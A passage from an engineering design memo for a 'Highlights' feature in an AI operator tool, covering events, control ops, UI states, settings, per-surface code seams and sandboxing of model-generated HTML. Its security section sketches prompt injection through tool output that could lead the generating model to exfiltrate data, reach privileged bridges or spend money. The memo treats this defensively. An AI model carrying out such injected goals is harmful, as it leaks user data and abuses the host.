- risk `lop exec --json` and SDK consumers treating it as part of the turn;
- inherit turn-interrupt cancel, which is precisely wrong here.

So the choice is a new event family. **The state machine is reused; the transport is not.**

```python
class SupplementProgressEvent(AgentEvent[Literal["supplement_progress"]]):
    anchor: str            # final assistant message id
    job: str
    version: int
    state: Literal["decided", "queued", "running", "cancelling", "done", "failed", "cancelled", "skipped"]
    stage: str = ""        # "deciding" | "generating" | "validating" | "repairing"
    elapsed_s: float = 0.0
    files: list[dict] = [] # only on "decided"/"done" (the same shape as the row)
    components: list[dict] = []  # only on "done": [{attachment, title, source, height_hint}]
    error: str = ""; error_type: str = ""
```

- `AgentEvent` is `extra="allow"` (`types.py:1893`). Followers rehydrate unknown types as
  base `AgentEvent` and "EventController ignores unknown types" (`session/attached.py:709-717`).
- `printable_event` emits it on `lop exec --json`, but rule 6 means exec never produces one.
- The mobile fold's explicit if/elif (`mobile/projection.py:1877-1880`) gains an arm.
- No `PROTOCOL_VERSION` bump: an additive event on a tolerant frame is the
  `AgentEndEvent.cut_off` precedent (`types.py:1910-1922`).
- The desktop bridge publishes `model_dump` (`desktop_sessions.py:2421-2422`). Under
  backpressure, `supplement_progress` joins `tool_execution_update`'s **keep-newest** fold
  (`desktop_sessions.py:2125-2140`), because the family is self-replacing by construction.

**Capability strings.**
- `supplements-v1`: a viewer that renders them. The attach gate is **two halves**: the
  runtime's owner-record capability list (assembled beside `display-history-audit-v1`,
  `session/runtime/server.py:2162-2163`) ANDed with the viewer's own boolean on its auth
  frame (`session/runtime/server.py:3754-3773` is the exact pattern). The desktop live path
  negotiates by route query param instead (`server/routes/desktop_sessions.py:4827-4842`, the
  `frontend_replace`/`entry_ts` shape), and relay/attach clients read the owner's list
  (`mobile/attach_client.py:1196-1208`). `features.supplements: 1` in `GET /v1/capabilities`
  (`server/features.py:24-38`) stays the static HTTP flag — it is not the attach gate
  (round-1 review R5).
- The runtime **always journals** rows (they are custom entries, which display windows do
  not carry). Only the **live events and the history projection** are gated, which avoids
  the `DisplayHistoryWindow` `extra="forbid"` trap (`history_window.py:39-60,79-80`):
  **no field is added to `DisplayHistoryWindow`.**
- Supplements reach viewers in three ways:
  - (a) live `supplement_progress` events;
  - (b) on the desktop, the history page, which serves raw journal entries including
    `custom` rows (`HistoryEntry.type: str`, `server/models/desktop_sessions.py:609-629`);
    the UI reducer currently returns `null` for non-`message` entries except
    `completion_attention` (UI `transcript-reducer.ts:2542-2592`), so it gains an arm;
  - (c) on TUI, relay and native, a new runtime read op `supplements_for(anchors[])`
    → `{anchor: newest row}`, called lazily when an answer row mounts (§2.11 lazy load).

**REST (blob fetch):**
- Desktop: `GET /v1/desktop/sessions/{sid}/supplements/{digest}/document` → `{html}`. It
  sits under the existing `/v1/desktop/` boundary (bearer from main via `desktopMedia`, UI
  `main/desktop-media.ts:67-97`; `no-store`, `server/app.py:700-714`). New `desktopMedia` op
  `sessions.supplementDocument`, digest regex `^[a-f0-9]{32}$`.
- Relay: `GET /api/sessions/{sid}/supplements/{digest}/document` → `{html}`, under `gate()`.
  It **does not** use `_entry_for_session`, which serves only live generations
  (`daemon.py:1551-1558`). It authorises by (a) cookie, (b) the session existing on disk,
  and (c) the digest being referenced by that session's journal (one `rfind` per
  `supplement_v1` row; a probe measures cost). It is digest-keyed, so it is `immutable`.
- Relay file-preview route for callouts: `GET /api/sessions/{sid}/supplements/{job}/file?i=<n>`
  → bytes with a `Content-Type` **from an allowlist** (text/markdown/CSV/JSON/image/PDF;
  never `text/html`, `image/svg+xml`, `application/xhtml+xml`, or any `+xml`), `nosniff`
  always, and `Content-Disposition: attachment` for every non-image class. **Only** for the
  indices recorded in the row (no client-chosen path); it re-applies the §4.3 denylist and a
  10 MB cap, and refuses for a remote-hosted session. Bytes render in-app — nothing navigates
  a browsing context to this route (§3.4). Note the tunnel forwards a fixed header set, so
  the frame-level CSP (§4.1) is the guarantee that does not depend on these headers surviving
  (round-1 security S-R6).
- Desktop has local IPC for files (UI `index.ts:2561-2815` *(scout)*) and needs no new
  route for local sessions.

**Tunnel header stripping is not a problem by design.** The gateway forwards a fixed
response-header set (`tunnels/gateway.py:320-329`) and overwrites CSP with
`frame-ancestors 'none'` (`:668-671`), so **every** policy this feature relies on rides inside
a document as `<meta http-equiv="Content-Security-Policy">` — the frame's own policy (§4.1)
*and*, on the relay, the **parent page's** `frame-src data:` (§4.1's Relay row), which a
response header would lose in transit (round-2 R2-3). The iframe `csp` attribute is not used —
it is not implemented in Chromium (round-1 review), so no response header and no unimplemented
attribute is relied on.

**Control ops (new; runtime dispatch, `session/runtime/server.py` after `:7115`):**

| op | frame | semantics |
|---|---|---|
| `supplement_cancel` | `{anchor, job}` | Cancel the running job task. State → `cancelling` → `cancelled` (written). Idempotent. Answers `"already finished"` for a settled job (reusing image-gen's neutral receipt, `tui/imagegen.py:195-197` *(scout)*). |
| `supplement_steer` | `{anchor, job, text}` (≤ 500 chars) | Cancel any in-flight attempt, then start version+1 with `instruction=text`. **Not** a turn: it never touches `_turn_lock`, the steering queue or the model context. |
| `supplement_restart` | `{anchor, job}` | Version+1 with the previous instruction (or none). Allowed from `failed`, `cancelled` or `done`. |
| `supplement_dismiss` | `{anchor}` | Writes `state=skipped, dismissed=true`; surfaces hide the row (the operator's "not useful" signal, counted as a spam event, §5.2). |

These ops are additive and capability-probed, exactly like `cancel` (`server.py:7117-7136`).
`supplement_steer`/`supplement_restart` spend money, so they are **not** in `_SYNC_PRIORITY_OPS`.
They ride the desktop/relay command routes (`validate_control_frame`, `mobile/types.py:209`),
are not authority-increasing, and are refused for an `Origin: null` caller (§4.1).

**Ordering, finally:** a supplement event or row is always *after* the turn's `agent_end`
(§2.1). It is anchored by `anchor`, so a late one (the next turn has already started) still
attaches to the right answer on every surface.

### 2.8 The indicator: one quiet line, the image-gen state machine

**States** (the frozen image-gen vocabulary: `tui/imagegen.py:87-92`, UI
`image-gen-card-model.ts:200-279` *(scout)*, native `imagegen.ts:72-78` *(scout)*):
`queued → running → (cancelling) → done | failed | cancelled`, with `decided` meaning "files
known, graphics queued" (which paints as `queued`).

**Copy and placement (one copy table; round-1 design D7/D10):**

| state | line |
|---|---|
| preparing (`decided`/`queued`/`running`) | `◌ Preparing highlights… · Adjust… · Cancel` |
| done | the line is replaced by the block (below) |
| user cancel (`cancelled`, no error or a non-`superseded` error) | `Highlights cancelled · Retry` (neutral ink, never error ink) |
| superseded (`error="superseded"`) | nothing — the line disappears silently; no Retry under an answer the user moved past |
| failure (any other error) | `Couldn't prepare highlights · Retry` |
| frame-level `{t:"error"}`, or a torn-down or hung frame (§4.1/§4.2) **with the job settled `done`** | the frame is replaced by one quiet line, `Couldn't render this graphic`; a `supplement_restart` Retry is offered when the job is settled. **Precedence (round-2 R2-4):** the row's committed `state` decides which line renders — a job-level `failed` renders the failure line above, never this one, and this line never rewrites a settled row |
| `skipped`/dismissed | nothing |

Steer and cancel render as a **pair** — `Adjust…` · `Cancel`, one `text-meta`/`ink-dim` line — never one hover-only while the other persists; on touch surfaces both are visible, tap targets ≥ 44 px (D10).

**Block anatomy (round-1 design D1).**
- Files-only with ≤ 2 files and no components: **one line, no header** — the contents themselves (`2 files: report.md, bench.csv`), never the bare word "Highlights" (§0).
- Otherwise: the header line ("Highlights", always with counts and names), up to `MAX_FEATURED` file rows, the "N more" affordance — **expand in place, bounded at the stored ≤ 20** — then components.
- **Aggregate frame budget:** frames mount automatically only within a cumulative `min(480 px, 40 vh)` of block height; anything beyond (MAX_COMPONENTS is 3) sits behind one disclosure (`Show all N graphics`) that expands in place on an explicit user action. Each frame still answers to its own [120, 480] clamp (§2.11).
- **Condensed turns:** the block condenses with its turn — one line, **no frames mounted while condensed** — and restores on expand (§2.11). A `done` row with zero components and zero files renders **nothing** (no header, no reserved frame space); a files-only finish reserves no frame space.
- **Captions, one place (D13):** the helper prints the component title and unit inside the document (D2, App. A); the host chrome renders exactly one `Source: …` line (§2.10); a model-supplied in-document `caption` is suppressed where it would restate the source. The reserved box carries the title as its label while the document loads.
- `branding.md` §7 (one quiet line, not a card, UI `branding.md:837-896` *(scout)*): the
  indicator is a line. The settled block is content, not chrome; the frame stays borderless
  and transparent (Appendix B).
- **Rows are load-bearing** (AGENTS.md TUI conventions *(scout)*): the TUI reserves the
  indicator row from `decided` onward and swaps it in place.
- Shimmer obeys `display.shimmer`/`LOCAL_OPERATOR_NO_SHIMMER` (`tui/imagegen.py:30-34`
  *(scout)*) and reduced motion on web/native.

**Reuse decision per surface:**
- **TUI:** reuse `imagegen_state_word`/`progress_graphic` from `tui/imagegen.py` as pure
  functions, not the tool-card variant.
- **UI:** reuse `ImageGenCardView`'s state union and the "absent handler = absent control"
  rule (`image-gen-card-model.ts:437-493` *(scout)*), with a new compact view.
- **Native and relay:** reuse their `imageGenView` adapters similarly.

### 2.9 Busy/idle, the next turn, shutdown

**Job ownership.** A `SupplementRunner` lives on `ServingSessionHandle`, holding at most one
task per session. Rules:
- A new eligible turn **supersedes** the running job: cancel it, write `cancelled` with
  `error="superseded"`, then start the new turn's decision. Prefer the newest answer.
- A steer/restart on an *older* anchor while a newer job runs is queued behind it (depth 1;
  a newer request replaces the queued one).

**Busy predicates — chosen deliberately:**
- `is_conversationally_active()` (`serving.py:1681-1746`, the sidebar spinner): **unaffected.**
  The turn is over; the line under the answer is the only activity cue.
- `is_busy()` (`serving.py:1627-1679`, reaper / `may_refresh` / drain): the job is **not**
  counted. It is held on `self._supplement_task`, **not** in `_background_tasks`, which
  `is_busy` reads (`:1677`). This is the goal-judge and completion-announcer precedent
  (`_completion_task`, `serving.py:1034,5675`). Consequences:
  - The reaper, a build refresh or a drain may cut a running job. That is acceptable because
    the job is droppable by contract ("updates/shutdown never wait on it").
  - Dispose cancels `_supplement_task` beside `_completion_task` (`serving.py:1555-1565`).
  - A cut job leaves `decided`/`queued` as its last durable state. On the next attach, a
    surface reading a non-terminal newest row whose `job` is not live in this runtime shows
    it as **`cancelled · Retry`** (a reader rule, so no resume-time write is needed — the
    full rule and its C0 fixture are in §2.4). A row whose `error` is `superseded` renders
    nothing (round-1 design D7; §2.8 copy table).
  - `is_pristine` is unaffected (the rearm-probe lesson, `serving.py:3694-3708`).
- **Next turn: never delayed.** The job holds no session lock and never touches `_context`.
  It reads the end event's messages and the journal, and writes through `append_custom`,
  which serialises on the transcript's own write lock, the same path the STT sidecar uses.
  `prompt()` admission (`session.py:8100-8110`) never sees it.
- **Provider contention.** Generator calls use a *different* model and are `isolated`, so
  they do not touch the session's sticky route, rotation or cache key (`complete_once`
  docstring, `session.py:18162-18200`). The decision is the classification HTTP client,
  separate from the provider.

### 2.10 Honesty: data in, data checked

- The generator may plot **only** `<data>` it declares, and the validator requires every
  numeric cell in `<data>` to appear in the evidence datasets. The comparison is
  canonicalised (`float` equality after the source's own decimal precision, or exact string
  match for identifiers).
- Derived values are allowed only as row-wise **sums, differences, ratios or percentages**
  of evidence values. They must be declared as columns named `"… (derived: a/b)"`, and the
  validator recomputes them. Anything else fails validation → repair turn → drop.
- Inline numeric literals in component scripts beyond layout constants are rejected by a
  static scan (§4.2): `\d{3,}` outside `viewBox`/style is a reject reason.
- Every component carries `source` (required). Surfaces render it as one caption line,
  `Source: bench.csv (rows 1-12)` — `text-meta`, `ink-muted`, single line, ellipsis with
  the full text available; the caption idiom of §2.8 means chrome and a model `caption`
  cannot double-render (round-1 design D13).
- **Rendered values are checked, not just the data (round-1 design D4).** `LO.fmt` prints
  each value at its own source precision by default; an explicit `digits` is the only way
  fewer decimals appear (pinned by a prelude unit test, §5.1). The validator carries a
  Python mirror of `LO.fmt` (same test vectors) and recomputes, from `<data>`, the numeric
  strings the component displays **statically** (labels, captions, callouts); a mismatch —
  including a baked-in rounded literal — is a repair reason.
- **QA spot-check:** for 10 random `done` components from the golden run, QA opens the
  `<data>` block and the cited source, and recomputes 3 **displayed** values each by hand.
  Zero mismatches is the bar (§5).

### 2.11 Lazy loading, fold and context

- A component frame mounts only when its answer row is in the viewport (IntersectionObserver
  on web, `onViewableItemsChanged` on native). Documents are cached by digest in each
  surface's existing blob/URL cache (UI `blob-url-cache` *(scout)*).
- Before the document resolves, a fixed **reserved box** of `height_hint` holds the space.
  `height_hint` is **clamped to [120, 480] px at write time by the validator** — the row
  never carries anything outside, and the reserved box, the clamp and every later `resize`
  all operate on that one range (round-1 review R8). A `resize` applies once per animation
  frame and **only when the row is below the viewport's scroll anchor**. This avoids a
  scroll jump (UI `use-scroll-paging.ts` *(scout)*).
- **Width changes redraw (round-1 design D3).** A `ResizeObserver` on the document re-runs
  every mounted helper on a width change (rAF-coalesced), so tick density, label thinning
  and text keep their set sizes; raw DOM/SVG components receive `LO.onSize(fn)`. The helper
  lays out natively down to the 220 px canvas-open column (216 px inner); below that floor —
  not a supported surface — the SVG scales as a whole. Text never scales in supported
  surfaces.
- **Condensed turns:** the block condenses with its turn (one line) and **mounts no frames
  while condensed**; expanding restores it. The aggregate frame budget the block mounts
  against is `min(480 px, 40 vh)` (§2.8, round-1 D1).
- **Outside the fold:** on the UI the Highlights row is a **statement** record placed after
  the answer, so the fold's trailing-statement walk keeps it visible (`isStatementRow`, UI
  `transcript-rows.ts:374-382`; `turn-segments.ts:504-514`). The new record kind
  `supplement` joins `isStatementRow`. On native it joins `STATEMENT_KINDS`
  (`turn-condensing.ts:123-129`) so condensing still works (scout finding 2).
- **Model context:** none. These are custom entries plus live events, nothing else.
  `supplement_v1` is not in `_PERSISTABLE_CUSTOM_TYPES` (`session.py:1169`), never rendered
  by `convert_to_llm`, and never returned by `build_llm_history`. Parity test in §5.1.

### 2.12 Configuration

**Kill switch:** `LOP_SUPPLEMENTS` (read once at import; only `0/false/no/off` disables), in
the `asks/policy.py:105-124` pattern. It is in `supplements/policy.py`.

**Settings section `supplements`** ("Highlights", scope `NEW_SESSIONS`, because the runner is
built per runtime), mirroring classification (`settings_io.py:453-478`). Every key has a
default constant beside its consumer and a `_consumer_defaults` entry (`AGENTS.md:3351-3381`).

| key | type / default | notes |
|---|---|---|
| `supplements.enabled` | bool / `true` | master; the other rows are `gated_by` it |
| `supplements.files` | bool / `true` | file callouts (no generator cost) |
| `supplements.graphics` | bool / `true` | generator (spends money) |
| `supplements.model` | str / `"auto"` | §2.5 ladder; `"session"` forces the session model |
| `supplements.maxTurns` | int / `2` | 1..4 |
| `supplements.maxOutputTokens` | int / `6000` | per generator turn |
| `supplements.timeoutS` | int / `90` | whole job |
| `supplements.maxCostUsd` | float / `0.20` | soft per-job cap — 2 × the measured **per-job** high end ($0.08) plus $0.04 of headroom, so a job inside its envelope is never stopped mid-repair; §5.3, round-1 R3/round-2 R2-6 |
| `supplements.maxFeatured` | int / `4` | the "N more" threshold |
| `supplements.denyPrefixes` | list[str] / `[]` | paths under these prefixes are never candidate files — the adoption knob for a machine holding customer data (round-1 S-R8) |

**Settings UIs.**
- TUI `/settings` renders the section automatically (`settings_view.py:1215-1217` *(scout)*).
- The UI's settings page gets a "Highlights" group in the UI lane.

**Ledger:** `purpose="supplement_decision"` is *not* used, because the decision is a
classification call and its cost is logged by the classification layer's INFO line
(`session_factory._log_classification_cost`, `:3099`). The generator's provider calls carry
`purpose="supplement_render"`. Purposes are open-valued (`ChatRequest.purpose`,
`harness/types.py:3296`; `CallSnapshot.purpose`, `analytics/model.py:222`). They are
automatically excluded from strike scoring, context tracking, effort classification and
preflight (`model/configure.py:3773,5850,5927,6002` *(scout)*), and appear in `by_purpose`
readouts. **No schema change.** The `/usage` row label (`session_panel.py:1742,1753`
*(scout)*) gains a display name "Highlights".

---

## 3. Seam list per surface

Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** = follow-up.

### 3.1 Core (`local-operator`)

| # | Seam | File:line | Change | Disp. |
|---|---|---|---|---|
| 1 | Run provenance | `session.py:11733-11756` (`_note_run_input`), `:13005-13008` (the accumulator's reset point) | add `_run_typed_user`, `_run_last_trigger`; accumulate the logical turn's messages beside `_logical_generation`, reset at the pipeline head and **never** in `_flush_held_end` (`:13100` clears `_logical_generation` before the `:13106` `_emit` freezes it; R2/R2-5); freeze `RunProvenance` in `_emit` beside `_attention_outcome` (`:12566`) | C |
| 2 | Settled signal | pipeline `finally`, after `on_turn_settled` (`session.py:13076-13089`) | set `self._turn_settled` (an `asyncio.Event`); cleared at pipeline head | C |
| 3 | Trigger | `serving.py:3100-3101` | `_maybe_supplement(event)` beside `_maybe_judge_goal`; schedules only | C |
| 4 | Runner | new `session/runtime/supplements.py` (`SupplementRunner`) held as `_supplement_task` | cancel on dispose (`serving.py:1555-1565`); NOT in `_background_tasks` | C |
| 5 | Pre-filter + candidates + denylist | new `local_operator/supplements/{candidates,evidence,denylist}.py` | pure; unit-tested; inputs are the logical-turn messages (§2.3, R2) | C |
| 6 | Decision | `classification/service.py:399` `decide` | two questions in `supplements/decision.py`; no service change in v1 | C/V |
| 7 | Generator | `supplements/generator.py`; request shape from `_errand_request` (`session.py:18278`) | new `Session.complete_supplement(model, system, turns)` (isolated) or a module-level helper over the session's `_stream_fn` | C |
| 8 | Validator | `supplements/validate.py` | parse, static scan, data provenance | C |
| 9 | Document assembler + prelude | `supplements/document.py`, `supplements/prelude/{prelude.css,prelude.js}` | `PRELUDE_VERSION`; package data in `pyproject` | C |
| 10 | Persistence | `transcript.py:1754` `append_custom`; `BOOKKEEPING_CUSTOM_TYPES` `:162-171`; a `SUPPLEMENT_CUSTOM_TYPE` constant beside `STT_TRANSCRIPT_CUSTOM_TYPE` `:188` | add type; `preserve_mtime=True` | C |
| 11 | Blobs | `attachments.py:167` `put_bytes(raw,"text/html")` | none | V |
| 12 | Sync | `network/sync.py:396` regex | none (key name `attachment`) | V |
| 13 | Event | `harness/types.py` after `:2530`; `session/attached.py:586` `_EVENT_TYPES` | new class + registration | C |
| 14 | Desktop bridge fold | `desktop_sessions.py:2125-2140` | add to keep-newest families | C |
| 15 | Desktop route | `server/routes/desktop_sessions.py` near `:3466` | `…/supplements/{digest}/document`; 409 `attachment_on_peer` passthrough | C |
| 16 | Capabilities | `server/features.py:38`; `session/runtime/server.py:2162-2163` + `:3754-3773`; `routes/desktop_sessions.py:4827-4842` | `"supplements": 1` + the two-half attach gate (§2.7, R5) | C |
| 17 | Runtime ops | `session/runtime/server.py:7097-7136` | `supplement_cancel/steer/restart/dismiss`, `supplements_for` | C |
| 18 | Mobile projection | `mobile/projection.py:1877` (`fold_event`), `mobile/types.py:631` (`TranscriptEntry`) | new `kind:"supplement"` entry **only for viewers that negotiated `supplements-v1`** (old native shows unknown kinds visibly, scout finding 1); live state onto the entry | C |
| 19 | Relay routes | `mobile/daemon.py:6636-6742` route table | `…/supplements/{digest}/document`, `…/supplements/{job}/file` | C |
| 20 | Relay command ops | `mobile/daemon.py:5292-5316`, `mobile/types.py:209` | pass-through of the four ops | C |
| 21 | Relay web | `mobile/web/src/components/transcript.tsx:183-219`, new `supplement-frame.tsx`, `lib/supplement.ts` | render; theme push; files list | C (mobile-relay lane) |
| 22 | Config | `settings_io.py` (section + 10 settings), `tests/unit/test_settings_io.py` `_consumer_defaults` | §2.12 | C |
| 23 | Kill switch | `supplements/policy.py` | §2.12 | C |
| 24 | Usage label | `tui/widgets/session_panel.py:1742,1753` | purpose → "Highlights" | C |
| 25 | Exec/SDK | `headless_print.py:260-265`, `sdk.py:584` | none (rule 6; no handle) | V |
| 26 | Guide | `local_operator/guides/` | `guides/highlights/GUIDE.md` (≤ 80 lines) | C (docs lane) |

### 3.2 TUI (in core repo, separate PR)

| # | Seam | File:line | Change |
|---|---|---|---|
| T1 | Answer anchor | `tui/session_presentation.py:1572-1579` (`completion_anchor_id`) | a `SupplementBlock` mounted after the answer block with the same anchor; replay via `project_settled_rows` (`:916`) + `harness/rows.py` (one row decision, `rows.py` docstring) |
| T2 | Live | `tui/app.py` event handler (over the 1 MB grep cap; probe P7 names the handler) | `supplement_progress` → reserve/swap the row |
| T3 | Files | `tui/link_targets.py:81-86,254-261` (`_SCHEME`, `is_openable`) | **a file affordance, not a scheme widening** (round-1 security S-R2/S-R5): a separate `file_affordance(path)` that admits **regular files only** — suffix allowlist (text/markdown/CSV/TSV/JSON/image/PDF) + `stat` check, **never** `.app`/`.command`/`.sh`/`.scpt`/`.workflow`/`.pkg`/`.dmg`/`.terminal`/`.webloc`/`.inetloc`, an executable bit, a directory, or a symlink resolving outside the allowed roots (session cwd, `~`). Paint-time gating equals open-time gating: build the link with `Path.as_uri()` (percent-encoding for free — Rich/textual write `style._link` verbatim, `rich/style.py:716`, `textual/strip.py:704`, so interpolation is a terminal-escape injection), and pass every host-rendered string (file names, titles, captions, the "N more" line) through one `display_text()` helper that strips C0/C1 controls — one helper, not four habits (UI/native reuse the same fixture set). The click opens **Reveal in Finder** (`open -R`; never `webbrowser`); "open in default app" is a separate deliberate affordance. Clicks go through Textual's handler (`transcript.py:868-900`); terminals handle modifier-clicks themselves, which is why the guard must hold at paint time too. |
| T4 | Images | `tui/session_presentation.py:1949` `append_image_blocks`; `tui/images.py:77` (8 live kitty images) | image components (if any) only; HTML → skipped, no placeholder |
| T5 | Indicator | `tui/imagegen.py` pure fns | one reserved row; `ctrl+c` is NOT bound (it is the turn interrupt, `tool_card.py:189-190` *(scout)*); `/highlights cancel|retry|adjust <text>` slash commands instead |

### 3.3 UI (`local-operator-ui`)

| # | Seam | File:line (UI) | Change |
|---|---|---|---|
| U1 | Durable row | `transcript-reducer.ts:2542-2592` | map `custom/supplement_v1` → a `supplement` record (newest per anchor) |
| U2 | Live | `transcript-reducer.ts` event switch (`:4766-4878`, `default: return state`) | `supplement_progress` arm |
| U3 | Fold | `transcript-rows.ts:374-382` `isStatementRow` | add `supplement`; must NOT become a `boundaryKindOf` pin |
| U4 | Render | new `features/chat/canonical/supplement-row.tsx` after the foot (`canonical-transcript.tsx:1305-1360`) | files list + frames + indicator |
| U5 | Frame | new `supplement-frame.tsx` | §4.1 desktop delivery |
| U6 | Main-process guard | `src/main/index.ts` (main window, `:790-814`, `:969-1049`) | add a **stateful one-shot** `will-frame-navigate` guard on the supplement frame: allow exactly the first navigation per frame element (byte-for-byte vs the `data:` URL the host itself set at mount; armed once, disarmed after) and deny every later navigation regardless of URL — no `about:blank`/`about:srcdoc` allow, no URL/nonce pattern (round-1 S-R1/S-R4). `setWindowOpenHandler` keeps denying non-auth popups and gains an `http(s)` scheme gate before `shell.openExternal` (S-R11) |
| U7 | CSP | `src/renderer/index.html:31-32` | `frame-src` stays as-is: `data:` is already allowed, and the list cannot shrink to `data:`-only — existing previews frame `blob:` (pdf-preview) and the backend origin (html-preview). The belt on this host is U6's stateful guard + the navigation counter (round-1 R1) |
| U8 | Files | `utils/open-in-canvas.ts:92-152`, `link-toolkit.tsx:297-339`, `canvas-content.tsx:51-84` | reuse: Open in canvas / Reveal / Open in default app; type icon by `viewerFor(path)` |
| U9 | Media op | `main/desktop-media.ts:67-97` | `sessions.supplementDocument` |
| U10 | Settings | settings page | "Highlights" group |
| U11 | Theme push | `themes/index.ts:238-245` | an observer posts to mounted frames |

### 3.4 Native (`local-operator-mobile`)

| # | Seam | File:line (mobile) | Change |
|---|---|---|---|
| N1 | Dependency | `package.json:36-69` | add `react-native-webview` (native module; reason recorded per `AGENTS.md:52-53` *(scout)*) |
| N2 | Row | `transcript-row.tsx:59-66,209-246`, `projection.ts:41-80` | `supplement` kind renderer |
| N3 | Condensing | `turn-condensing.ts:123-129` | add `"supplement"` to `STATEMENT_KINDS` |
| N4 | Frame | new `supplement-webview.tsx` | §4.1 native delivery |
| N5 | Files | none today (no share/open, scout) | v1: name + size + "Preview" for text/image via the relay file route — bytes rendered **in-app from the fetched response**, never by navigating a browsing context to the route (round-1 S-R6); "Share" via `expo-sharing` is a new dependency → **phase 2** |
| N6 | Contracts | `contracts/schemas.ts` (loose objects; open `EntryKind`) | schema for the entry and the event |

---

## 4. Security — gating, every surface

**Threat model.** Generated HTML/JS/CSS is untrusted. Its author is a model that read tool
output, which may contain attacker-controlled text: a web page, a file, an issue body. The
attacker's goals are:
- (a) reach a privileged bridge (the UI preload's `readFile`/`openFile`/`save-file`,
  UI `src/preload/index.ts:288-347` *(scout)*; the relay's mutating `/api/*` on its cookie
  origin, `daemon.py:6636-6765`);
- (b) exfiltrate conversation data over the network;
- (c) navigate or phish the host;
- (d) list or preview a secret file;
- (e) **execute code on the host through the file-callout UI** (round-1 S-R5: a file
  affordance must never launch what it cannot vouch for);
- (f) **spend money or consume vendor egress** by prompt-injecting the decision and
  generator (round-1 S-R8 — the decision is a paid third-party call on every eligible turn).

**Egress boundary (one statement; round-1 S-R8).** Every payload this feature sends to a
vendor — the decision state, the option text, the evidence datasets, the steer text —
passes `redaction_shapes.scrub_shapes` (`redaction_shapes.py:5112`) before it leaves the
process, and the decision request is additionally **minimised**: file basenames, sizes and
writing tools only — no relative directories, no file contents, no tool output, no absolute
paths. What is withheld is stated where each payload is built (§2.3, §2.5), and the S-matrix
inspects the request body at the data (§4.4 S17).

### 4.1 Delivery and isolation per surface

**The invariant, on every surface:**
- an opaque origin, with the iframe sandbox exactly `allow-scripts`. Never
  `allow-same-origin`, `allow-popups`, `allow-forms`, `allow-top-navigation*`,
  `allow-modals` or `allow-downloads`;
- no bridge;
- the document CSP `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
  img-src data:; font-src data:; connect-src 'none'; frame-src 'none'; form-action 'none';
  base-uri 'none'` (`'unsafe-inline'` is safe here only *because* the origin is opaque and
  the network is closed);
- **the frame's own navigation is bounded per surface (round-1 R1/S-R1; dispatch corrected in
  round-2 S-R2-1).** The sandbox does **not** cover it (`sandbox="allow-scripts"` lets a frame
  navigate *itself*: the sandboxed-navigation flag covers navigation of *other* contexts), and
  neither does the frame's **own** document CSP — `navigate-to` is unimplemented in Chromium and
  the `<iframe csp>` attribute is unimplemented too, so neither is relied on. But the
  **embedding** document's `frame-src` does govern it: Chromium checks every navigation of an
  already-loaded child frame — script-, `meta refresh`- and embedder-initiated alike — and
  blocks it **before the request is issued**, reporting the violation to the embedding document
  (measured on Chrome 155 with the target server seeing nothing; longstanding,
  w3c/webappsec-csp#509). That distinction is the whole reason the relay's `frame-src data:`
  line is a control and not decoration. Per surface:
**Electron** — a stateful one-shot `will-frame-navigate` guard (below); **native** — a
one-shot `onShouldStartLoadWithRequest` rule (below); **relay web**, which has no
interception point for a subframe navigation — a parent-page CSP `frame-src data:`, declared
in-document as `<meta http-equiv="Content-Security-Policy" content="frame-src data:">` in
`mobile/web/index.html` (a response header is overwritten in transit, §2.7), plus a
second-`load` teardown (below). Belt-and-braces on the desktop too: the guard is primary,
and any frame whose navigation counter has moved has its messages dropped and is unmounted
as hostile — a guard bug must not silently become an exfil path;
- the host accepts only `{lo:"supplement", v:1, t: "ready"|"resize"|"error"|"pong"}` shapes from
  its own frame, and **every message that can move host state must carry the per-frame
  nonce** the host minted and sent in the first theme push (`ready` is accepted without one:
  the theme push has not been delivered yet and it moves nothing). `event.source ===
  frame.contentWindow` identifies the *browsing context*, not the document — a navigated
  frame keeps both `source` and `Origin: null` — so the nonce and the navigation counter are
  the binding, alongside `event.origin === "null"` (round-1 S-R4). The nonce never appears
  in the URL: a navigated document cannot read it from `location`, and a re-navigation to a
  `data:` URL carrying the host's fragment is denied by the one-shot guard;
- the host sends only `{lo:"supplement-host", t:"theme", mode, vars, nonce}` and
  `{t:"ping"}`; the frame answers `{lo:"supplement", v:1, t:"pong"}` (§4.2's watchdog, one
  outstanding at a time, never coalesced away; round-2 S-R2-5).
- **what remains unprovable (round-2 S-R2-3).** These checks prove *browsing-context
  continuity*: the nonce never left the original document, a successor cannot hold it (the only
  allowed navigation is the byte-matched mount load and every other is denied), and messages
  from a moved frame are dropped. They do **not** prove *document provenance*: every document in
  a sandboxed frame presents `Origin: null` behind the same `contentWindow`, so a guard or event
  path the host misses would be invisible to the binding. That residual is why S8/S13 stay live,
  and why the Electron event coverage — measured on Electron 44.3.0: `will-frame-navigate` fires
  for the mount load and for a self-navigation, and `event.preventDefault()` stops it
  pre-request — is **re-asserted per release**, not only at introduction.

| Surface | Delivery | Why this one (evidence) |
|---|---|---|
| **UI (Electron renderer)** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` — the delivery **P1 decides** between (1) the `data:` URL, (2) a dedicated custom protocol, (3) `blob:`. The html comes from `sessions.supplementDocument` via main (bearer added in main); the CSP meta rides inside the document. | **Acceptance, settled at P1:** *the initial document loads AND the CSP is enforced* (the inline component script runs under the document's own policy; no embedder-policy inheritance surprise). The spec basis is contested — fetch's "is local" includes `data:`, whose policy-container step would inherit the initiator's CSP list, while Chromium has drifted by navigation method (crbug 40053796) — and the memo asserts neither reading. `srcdoc` inherits the renderer's `script-src 'self' …` (UI `index.html:31-32`) and is rejected. **Option 2's requirements are fixed now:** `registerSchemesAsPrivileged({scheme:"lo-supplement", privileges:{standard:true, secure:false, corsEnabled:false, bypassCSP:false}})`, its handler serves only stored digests with the §4.1 document policy as a response header + `X-Content-Type-Options: nosniff` + `Cache-Control: no-store`, and the frame keeps `sandbox="allow-scripts"` so the origin stays opaque either way. `secure:true` is the one to avoid: a secure context re-opens `RTCPeerConnection` (CSP does not govern WebRTC), `navigator.clipboard` and `crypto.subtle`. P1 records `window.isSecureContext` and `typeof RTCPeerConnection` for the winner — those are what decide whether the fallback is a downgrade (§9). Size: ≤ 64 KB documents are fine as data: URLs. |
